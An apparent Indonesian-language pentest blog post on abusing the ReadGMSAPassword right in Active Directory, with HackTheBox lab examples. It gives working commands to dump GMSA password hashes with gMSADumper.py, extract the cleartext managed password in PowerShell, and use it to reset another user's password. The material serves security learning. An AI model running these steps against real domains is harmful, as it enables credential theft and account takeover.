---
title: '[ACL] ReadGMSAPassword Abuse'
date: 2022-05-05 10:10:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, readgmsapassword Abuse, privilege escalation, lateral movement]     # TAG names should always be lowercase
author: nairpaa
---

[**Group Manage Service Accounts**](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-group-managed) (GMSA) memberikan tambahan keamanan untuk *service accounts*.

*Group Managed Service Accounts* adalah object AD khusus, di mana password untuk object tersebut dapat dikelola secara otomatis oleh Domain Controller.

Tujuan penggunaan GMSA ini adalah untuk memungkinkan akun komputer tertentu mengambil password GMSA, kemudian menjalankan layanan lokal sebagai GMSA. 

Dengan memiliki hak akses `ReadGMSAPassword`, penyerang dapat mengambil password hash GMSA.

### Tujuan 

- *Privilege escalation* atau
- *lateral movement*

### Prasyarat

- User dengan hak akses `ReadGMSAPassword`


### Tools

- [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper)

---

## Tahapan eksploitasi

### On Linux (remote)

#### Step 1: Cek Hak Akses Dengan BloodHound

Pada kasus kali ini, **SVC_INT.INTELLIGENCE.HTB** adalah *Group Managed Service Account*. Dan anggota grup **ITSUPPORT@INTELLIGENCE.HTB** dapat mengambil password GMSA **SVC_INT.INTELLIGENCE.HTB**.

![Bloodhound - readgmsapassword](/assets/img/posts/readgmsapassword-abuse/1.png)

#### Step 2: Dapatkan Password GMSA

Jalankan perintah berikut untuk mendapatkan password GMSA dalam bentuk hash. Hash ini dapat digunakan untuk serangan [Pass-The-Hash](/posts/pass-attack/).

```bash
➜ gMSADumper.py -u <username> -p <password/hash> -d <domain>
```

![gMSADumper](/assets/img/posts/readgmsapassword-abuse/2.png)

### On Windows (local)

> Penjelasan untuk mendapatkan GMSA password melalui lokal windows telah dijelaskan dengan baik pada [artikel ini](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/).
{: .prompt-note }

#### Step 1: Cek Hak Akses Dengan BloodHound

Pada kasus kali ini **Sierry.Frye** yang merupakan grup dari **ITSEC** memiliki hak akses `ReadGMSAPassword` terhadap akun **BIR-ADFS-GMSA**.

![ReadGMSAPassword bloodhound](https://0xdf.gitlab.io/img/image-20211117122421371.webp)

#### Step 2: Dapatkan Password GMSA

```powershell
# mendapatkan password GMSA 
PS> $gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
PS> $mp = $gmsa.'msDS-ManagedPassword'
PS> ConvertFrom-ADManagedPasswordBlob $mp
 
 
Version                   : 1
CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤
                            ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇
SecureCurrentPassword     : System.Security.SecureString
PreviousPassword          : 
SecurePreviousPassword    : 
QueryPasswordInterval     : 3062.06:26:26.3847903
UnchangedPasswordInterval : 3062.06:21:26.3847903
```

#### Step 3: Menggunakan Password Sebagai Kredensial Powershell

Selanjutnya, password GMSA yang panjang tersebut dapat kita gunakan untuk menginputkan kredensial di powershell.

Sebagai contoh pada kasus ini akun **BIR-ADFS-GMSA** memiliki hak akses `genericAll` terhadap **Tristan.Davies**. Hal ini membuat kita bisa mengubah password dari user tersebut.

```powershell
# mengatur kredensial GMSA di powershell 
PS > (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱
茾蒚⟒澽座걍盡篇
PS > $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
PS > $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
PS > $cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $SecPass

# mengubah password user Tristan.Davies menggunakan kredensial GMSA
PS > Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'P@ssw0rd123!' -force)} -Credential $cred
```

--- 

## Referensi

- https://github.com/micahvandeusen/gMSADumper
- https://www.thehacker.recipes/ad/movement/access-controls/readgmsapassword
- https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/
- https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html#gmsa-password
- https://stealthbits.com/blog/securing-gmsa-passwords/
- https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/
- https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password